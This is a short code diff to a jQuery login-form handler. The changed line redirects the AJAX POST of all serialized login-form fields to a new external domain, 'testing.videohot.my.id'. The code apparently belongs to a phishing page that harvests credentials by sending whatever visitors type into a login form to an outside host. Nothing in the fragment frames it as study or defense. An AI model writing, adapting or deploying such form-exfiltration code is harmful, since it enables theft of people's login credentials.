@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "https://extreme-lookup.com/json/",
+        url: "https://testing.videohot.my.id/json/",
         type: "POST",
         data: d.serialize(),
         success: function () {
